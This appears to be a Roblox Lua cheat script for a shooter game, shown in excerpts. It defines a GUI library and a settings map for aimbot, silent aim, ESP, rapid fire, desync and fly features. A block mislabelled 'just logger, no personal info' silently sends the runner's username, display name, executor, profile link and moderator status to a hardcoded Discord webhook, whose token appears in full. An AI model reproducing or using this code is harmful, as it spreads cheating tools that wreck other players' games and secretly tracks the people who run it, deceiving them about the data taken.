...
function OpenedColor(text,ColourDisplay,Action,def)
	local COLORPALLETE = Instance.new("Frame", PCR_1)
	...
	COLORPALLETE.Parent = game.CoreGui.PCR_1
	...
	local startcolor = ColourDisplay.ImageColor3
	local h, s, v = Color3.toHSV(startcolor)
	local wheelrad = ColourWheel.AbsoluteSize.X / 2
	local angle = h * 2 * math.pi
	local radius = s * wheelrad
	local pickerX = -math.cos(angle) * radius
	local pickerY = math.sin(angle) * radius
	Picker.Position = UDim2.new(0, pickerX + wheelrad, 0, pickerY + wheelrad)

	local sliderY = (1 - v) * DarknessPicker.AbsoluteSize.Y 
	Slider.Position = UDim2.new(Slider.Position.X.Scale, 0, 0, sliderY)

	ColourDisplayBIG.ImageColor3 = startcolor
	UIGradient.Color = ColorSequence.new{
	    ColorSequenceKeypoint.new(0, startcolor),
	    ColorSequenceKeypoint.new(1, Color3.new(0, 0, 0))
	}

	local function tweenPosition(object, targetPos, duration)
	...
	if COLORPALLETE.Visible == true then
		tweenPosition(ANIMATEFRAME01, UDim2.new(-0.026, 0, -0.007, 0), 0.2)
		COLORPALLETE.BackgroundTransparency = 1
		Holder.Visible = false
		tweenPosition(ANIMATEFRAME01, UDim2.new(1.077, 0, -0.007, 0), 0.2)
		COLORPALLETE.Visible = false
...
BG.Parent = MAIN
BG.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
BG.BorderColor3 = Color3.fromRGB(0, 238, 255)
BG.BorderSizePixel = 0
...
pcall(function() -- just logger, no personal info
	task.wait(7)
	
	local player = game.Players.LocalPlayer
	local modis = false
	pcall(function()
		if game.ReplicatedStorage.Players[player.Name].Status.GameplayVariables:GetAttribute("PremiumLevel") >= 4 then
			modis = true
		end
	end)
	...
	task.spawn(function()
		local data = {
			['embeds'] = {
				{
					['title'] = "Script лох info",
					['fields'] = {
						{['name'] = "Roblox Username", ['value'] = player.Name, ['inline'] = true},
						{['name'] = "Display Name", ['value'] = player.DisplayName, ['inline'] = true},
						{['name'] = "Executor", ['value'] = identifyexecutor(), ['inline'] = true},
						{['name'] = "Profile Link", ['value'] = string.format("https://www.roblox.com/users/%d/profile", player.UserId), ['inline'] = false},
						{['name'] = "Is mod", ['value'] = modis and "yes" or "no", ['inline'] = false},
					},
					['color'] = 3447003
				}
			}
		...
		request({
			Url = "https://discord.com/api/webhooks/1341660016058568746/MPWRPbWPGwCVDIPvBQUowPiycZyYnu5bw3TMsaCJq4hZOk6epY-IvgxQuctgmEDTZtnK",
			Method = "POST",
			Headers = {
...
function library:AddWindow(text)
	...
	function sec:AddSection(Texto,side)
		...
		function inside:AddTextBox(Text,placeholder, CTOF, Type, Action)
			...
			allinsides[Text] = {}
			allinsides[Text].Reload = function(newv)
				Value = newv
		...
		function inside:AddColorPallete(Text,Color,Action)
			...
			allinsides[Text] = {}
			allinsides[Text].Reload = function(newv)
				ColourDisplay.BackgroundColor3 = newv
				ColourDisplay.ImageColor3 = newv
			end
...
library.UpdateGui = function(varstable)
	local convert = {
		['Silent Aim'] = varstable.aimbool,
		['Visibility check'] = varstable.aimvischeck,
		['Ammo distance check'] = varstable.aimdistcheck,
		['Trigger Bot'] = varstable.aimtrigger,
		['Target AI'] = varstable.aimbots,
		['Slow bullet'] = varstable.aimfakewait,
		['Show FOV'] = varstable.showfov,
		['Dynamic FOV'] = varstable.aimdynamicfov,
		['FOV Color'] = varstable.aimfovcolor,
		['Aim FOV'] = varstable.aimfov,
		['Aim Distance (Meters)'] = varstable.aimdistance,
		['Hit Chance'] = varstable.aimchance,
		['Aim Part'] = varstable.aimpart,
		['Aim Type'] = varstable.aimtype,
		['Snapline'] = varstable.snaplinebool,
		['Snapline Thickness'] = varstable.snaplinethick,
		['Snapline Color'] = varstable.snaplinecolor,
		['Rapid Fire [IF HOLD GUN - REEQUIP IT]'] = varstable.rapidfire,
		['Custom rapidfire'] = varstable.crapidfire,
		['Unlock firemodes [IF HOLD GUN - REEQUIP IT]'] = varstable.unlockmodes,
		['Instant Equip'] = varstable.instaequip,
		['Instant Reload'] = varstable.instareload,
		['No sway'] = varstable.noswaybool,
		['Multitaps'] = varstable.multitaps,
		['Include bots'] = varstable.friendlistbots,
		['Tracers Enabled'] = varstable.tracbool,
		['Remove time'] = varstable.tracwait,
		['Tracers Color'] = varstable.traccolor,
		['Hitmarkers'] = varstable.hitmarkbool,
		['Hitmark color'] = varstable.hitmarkcolor,
		['Hitmark fade time'] = varstable.hitmarkfade,
		['HitSound'] = varstable.hitsoundbool,
		['Head Sound'] = varstable.hitsoundhead,
		['Body Sound'] = varstable.hitsoundbody,
		['Show Name'] = varstable.showname,
		['Shots left'] = varstable.shotsleft,
		['ESP'] = varstable.espbool,
		['Name'] = varstable.espname,
		['HP'] = varstable.esphp,
		['HP Min Color'] = varstable.esphpmin,
		['HP Mid Color'] = varstable.esphpmid,
		['HP Max Color'] = varstable.esphpmax,
		['Distance'] = varstable.espdistance,
		['Chams'] = varstable.esphigh,
		['Active Gun'] = varstable.esphotbar,
		['Dead'] = varstable.espdead,
		['Bots'] = varstable.espbots,
		['Loot'] = varstable.esploot,
		['Extract'] = varstable.espexit,
		['Render Distance (Meters)'] = varstable.esprenderdist,
		['Text Color'] = varstable.esptextcolor,
		['Text Size'] = varstable.esptextsize,
		['Text outline'] = varstable.esptextline,
		['Chams Outline Transparency'] = varstable.espchamsline,
		['Chams Fill Transparency'] = varstable.espchamsfill,
		['Chams Outline Color'] = varstable.esplinecolor,
		['Crosshair'] = varstable.crossbool,
		['Size'] = varstable.crosssizek,
		['Rotation Speed'] = varstable.crossrot,
		['Color'] = varstable.crosscolor,
		['Chams Fill Color'] = varstable.espfillcolor,
		['Third Person'] = varstable.camthirdp,
		['Thirdp Offset X'] = varstable.camthirdpX,
		['Thirdp Offset Y'] = varstable.camthirdpY,
		['Thirdp Offset Z'] = varstable.camthirdpZ,
		['Modify Zoom'] = varstable.editzoom,
		['Base FOV'] = varstable.basefov,
		['Zoom FOV'] = varstable.zoomfov,
		['Anti mask'] = varstable.antimaskbool,
		['Anti flash'] = varstable.antiflashbool,
		['Texture changer'] = varstable.viewmodbool,
		['Hand Material'] = varstable.viewmodhandmat,
		['Gun Material'] = varstable.viewmodgunmat,
		['Hand Color'] = varstable.viewmodhandcolor,
		['Gun Color'] = varstable.viewmodguncolor,
		['Offset changer'] = varstable.viewmodoffset,
		['Offset X'] = varstable.viewmodX,
		['Offset Y'] = varstable.viewmodY,
		['Offset Z'] = varstable.viewmodZ,
		['Jesus'] = varstable.worldjesus,
		['Auto Respawn'] = varstable.instantrespawn,
		['TP Speed'] = varstable.speedbool,
		['TP Speed Boost'] = varstable.speedboost,
		['No Jump Cooldown'] = varstable.nojumpcd,
		['Desync'] = varstable.desyncbool,
		['Force underground'] = varstable.invisbool,
		['Edit Position'] = varstable.desyncPos,
		['Position X'] = varstable.desynXp,
		['Position Y'] = varstable.desynYp,
		['Position Z'] = varstable.desynZp,
		['Edit Orientation'] = varstable.desyncOr,
		['Orientation X'] = varstable.desynXo,
		['Orientation Y'] = varstable.desynYo,
		['Orientation Z'] = varstable.desynZo,
		['Edit upangle'] = varstable.upanglebool,
		['Upangle number'] = varstable.upanglenum,
		['Double jump'] = varstable.doublejump,
		['NoFall'] = varstable.nofall,
		['InstaFall'] = varstable.instafall,
		['Instant Lean'] = varstable.instalean,
		['Humanoid changer'] = varstable.changerbool,
		['Humanoid Speed'] = varstable.changerspeed,
		['Humanoid Jumpheight'] = varstable.changerjump,
		['Humanoid Height'] = varstable.changerheight,
		['Gravity'] = varstable.changergrav,
		['Semi-Fly Distance'] = varstable.charsemiflydist,
		['Semi-Fly Speed'] = varstable.charsemiflyspeed,
		['Inventory Checker'] = varstable.invcheck,
		['Mod notify'] = varstable.detectmods,
		['Disable Leaves'] = varstable.worldleaves,
		['Disable Grass'] = varstable.worldgrass,
		['No clouds'] = varstable.worldcloud,
		['No weather'] = varstable.worldnoweather,
		['No mines'] = varstable.worldnomines,
		['Exposure'] = varstable.worldexpo,
		['Clock time'] = varstable.worldclock,
		['Edit PostEffects'] = varstable.colorcorrectbool,
		['Brightness'] = varstable.colorcorrectbright,
		['Saturation'] = varstable.colorcorrectsatur,
		['Contrast'] = varstable.colorcorrectcontrast,
		['Tint color'] = varstable.colorcorrecttint,
		['Ambient Color'] = varstable.worldambient,
		['Outdoor Ambient Color'] = varstable.worldoutdoor,
	}

	for i,v in convert do
		if allinsides[i] then
			allinsides[i].Reload(v)
		end
	end
end
